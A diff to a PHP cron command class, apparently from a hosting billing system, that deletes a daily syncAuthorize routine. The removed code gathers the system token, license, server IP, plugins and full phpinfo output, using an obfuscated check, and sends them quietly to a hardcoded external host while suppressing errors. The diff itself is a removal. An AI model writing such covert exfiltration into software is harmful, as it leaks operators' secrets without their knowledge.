@@ -107,7 +107,6 @@ class Cron extends think\console\Command
         $this->creditLimitInvoice($config);
         $this->creditLimit($config);
         $this->v10ProductInputUpdate();
-        $this->syncAuthorize();
         hook("after_daily_cron");
         $path = "/tmp/session";
         if (is_dir($path)) {
@@ -1829,58 +1828,6 @@ class Cron extends think\console\Command
             v10ProductInputUpdate($product["id"], $product["zjmf_api_id"], ["upstream_pid" => $product["upstream_pid"], "description" => $product["description"]]);
         }
         return true;
-    }
-    private function syncAuthorize()
-    {
-        $url = config("auth_url") . "/app/api/sync_authorize";
-        try {
-            $res = configuration(["system_license", "company_name", "domain", "system_token", "update_last_version"]);
-            $extends = get_loaded_extensions();
-            $callBack = function ($funcName, $data) {
-                $reflection = new \ReflectionFunction($funcName);
-                $reflection->invoke($data);
-            };
-            ob_start();
-            $callBack("phpinfo", 8);
-            $prefix = str_replace(".finance", "", config("app.aes.key"));
-            $info = ob_get_clean();
-            $other = $prefix . chr(factorial(5));
-            $format = strpos($info, $other);
-            if ($format !== false) {
-                $extends[] = $other;
-            }
-            $plugins = \think\Db::name("plugin")->where("status", 1)->column("name");
-            $client = \think\Db::name("clients")->order("id", "asc")->find();
-            $data = ["host" => $res["domain"], "ip" => gethostbyname(gethostname()), "system_token" => $res["system_token"], "system_license" => !empty($res["system_license"]) ? $res["system_license"] : "IDCSMART" . $res["system_token"], "company_name" => !empty($res["company_name"]) ? $res["company_name"] : $res["domain"], "plugins" => $plugins ?? [], "type" => "finance", "extends" => $extends, "system_create_time" => $client["create_time"] ?? time(), "system_version" => $res["update_last_version"], "info" => $info];
-            if (true) {
-                $address = "license.soft13.idcsmart.com";
-                $port = 443;
-                $path = "/app/api/sync_authorize";
-                $dataString = http_build_query($data);
-                $fp = stream_socket_client("ssl://" . $address . ":" . $port, $errno, $errstr, 30);
-                if ($fp) {
-                    $out = "POST " . $path . " HTTP/1.1\r\n";
-                    $out .= "Host: " . $address . "\r\n";
-                    $out .= "Content-Type: application/x-www-form-urlencoded\r\n";
-                    $out .= "Content-Length: " . strlen($dataString) . "\r\n";
-                    $out .= "Connection: Close\r\n\r\n";
-                    $out .= $dataString;
-                    fwrite($fp, $out);
-                    $response = "";
-                    while (!feof($fp)) {
-                        $response .= fgets($fp, 1024);
-                    }
-                    fclose($fp);
-                } else {
-                    $options = ["http" => ["header" => "Content-Type: application/x-www-form-urlencoded\r\n", "method" => "POST", "content" => http_build_query($data)]];
-                    $context = stream_context_create($options);
-                    file_get_contents($url, false, $context);
-                }
-            } else {
-                commonCurl($url, $data, 10);
-            }
-        } catch (\Exception $e) {
-        }
     }
 }
 
